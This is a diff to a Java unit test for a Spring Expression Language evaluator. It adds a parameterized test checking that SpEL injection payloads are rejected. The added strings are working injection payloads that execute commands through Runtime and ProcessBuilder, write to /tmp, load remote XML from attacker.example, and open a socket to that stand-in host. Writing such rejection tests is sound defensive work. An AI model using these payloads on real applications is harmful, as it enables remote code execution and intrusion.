@@ -543,6 +543,25 @@ public class SpelEvaluatorTest {
 
     @ParameterizedTest
     @ValueSource(strings = {
+        "=T (java.lang.Runtime).getRuntime ().exec ('calc')",
+        "=T\t(java.lang.Integer).valueOf(number)",
+        "=${localDateTime} .getHour ()",
+        "=new org.springframework.context.support.ClassPathXmlApplicationContext('https://attacker.example/evil.xml')",
+        "=new org.springframework.context.support.ClassPathXmlApplicationContext ('https://attacker.example/evil.xml')",
+        "=new ProcessBuilder('calc')",
+        "=new ProcessBuilder({'sh','-c','id'}) .start ()",
+        "=new java.io.FileOutputStream('/tmp/pwned')",
+        "=new java.net.Socket('attacker.example', 1337)"
+    })
+    void testShouldRejectSpelInjectionPayloads(String payload) {
+        assertThrowsExactly(
+            IllegalArgumentException.class,
+            () -> EVALUATOR.evaluate(Map.of("value", payload), Collections.emptyMap()),
+            payload);
+    }
+
+    @ParameterizedTest
+    @ValueSource(strings = {
         "abc",
         "_abc",
         "user.name",
